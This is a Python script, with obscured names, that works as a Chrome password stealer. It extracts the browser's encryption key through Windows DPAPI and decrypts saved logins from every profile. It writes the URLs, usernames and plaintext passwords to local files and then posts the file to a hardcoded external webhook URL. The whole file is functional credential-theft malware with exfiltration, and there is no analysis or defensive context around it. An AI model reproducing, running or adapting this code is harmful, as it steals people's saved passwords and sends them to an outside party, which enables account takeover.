import os as o
import re as r
import sys as s
import json as j
import base64 as b
import sqlite3 as q
import win32crypt as w
from Cryptodome.Cipher import AES as a
import shutil as h
import csv as c
import requests as req

# GLOBAL CONSTANTS
C1 = o.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State" % (o.environ['USERPROFILE']))
C2 = o.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data" % (o.environ['USERPROFILE']))

# Function to get secret key from Chrome's Local State
def k1():
    try:
        with open(C1, "r", encoding='utf-8') as f:
            l = f.read()
            l = j.loads(l)
        s_k = b.b64decode(l["os_crypt"]["encrypted_key"])
        s_k = s_k[5:]
        s_k = w.CryptUnprotectData(s_k, None, None, None, 0)[1]
        return s_k
    except Exception as e:
        print("%s" % str(e))
        print("[ERR] Chrome secretkey cannot be found")
        return None

# Function to decrypt the payload
def k2(cy, p):
    return cy.decrypt(p)

# Function to generate AES cipher
def k3(a_k, iv):
    return a.new(a_k, a.MODE_GCM, iv)

# Function to decrypt the password
def k4(c_t, s_k):
    try:
        iv = c_t[3:15]
        e_p = c_t[15:-16]
        cy = k3(s_k, iv)
        d_p = k2(cy, e_p)
        d_p = d_p.decode()
        return d_p
    except Exception as e:
        print("%s" % str(e))
        print("[ERR] Unable to decrypt, Chrome version <80 not supported. Please check.")
        return ""

# Function to get a connection to the Chrome database
def k5(chrome_db):
    try:
        h.copy2(chrome_db, "Loginvault.db")
        return q.connect("Loginvault.db")
    except Exception as e:
        print("%s" % str(e))
        print("[ERR] Chrome database cannot be found")
        return None

# Function to save output to a text file
def k6(output, file_name='decrypted_passwords.txt'):
    try:
        with open(file_name, 'w', encoding='utf-8') as f:
            f.write(output)
        print(f"[INFO] Output saved to {file_name}")
    except Exception as e:
        print(f"[ERR] Unable to save to {file_name}. Error: {str(e)}")

# Function to send the content of the txt file to the webhook
def k7(f_n, w_u):
    try:
        with open(f_n, 'r', encoding='utf-8') as f:
            data = f.read()
        response = req.post(w_u, data={'file_content': data})
        if response.status_code == 200:
            print(f"[INFO] Successfully sent the file to the webhook.")
        else:
            print(f"[ERR] Failed to send the file to the webhook. Status Code: {response.status_code}")
    except Exception as e:
        print(f"[ERR] Error while sending file to webhook: {str(e)}")

if __name__ == '__main__':
    try:
        output_data = ""

        with open('decrypted_password.csv', mode='w', newline='', encoding='utf-8') as df:
            cw = c.writer(df, delimiter=',')
            cw.writerow(["index", "url", "username", "password"])

            s_k = k1()
            f = [el for el in o.listdir(C2) if r.search("^Profile*|^Default$", el) is not None]

            for folder in f:
                c_db = o.path.normpath(r"%s\%s\Login Data" % (C2, folder))
                conn = k5(c_db)
                if s_k and conn:
                    cursor = conn.cursor()
                    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                    for index, login in enumerate(cursor.fetchall()):
                        url = login[0]
                        username = login[1]
                        ciphertext = login[2]
                        if url != "" and username != "" and ciphertext != "":
                            d_p = k4(ciphertext, s_k)
                            output_data += f"Sequence: {index}\nURL: {url}\nUsername: {username}\nPassword: {d_p}\n{'*'*50}\n"
                            cw.writerow([index, url, username, d_p])

                    cursor.close()
                    conn.close()
                    o.remove("Loginvault.db")

        k6(output_data)

        w_u = 'https://eojoofu0u14ynwn.m.pipedream.net'
        k7('decrypted_passwords.txt', w_u)

    except Exception as e:
        print(f"[ERR] {str(e)}")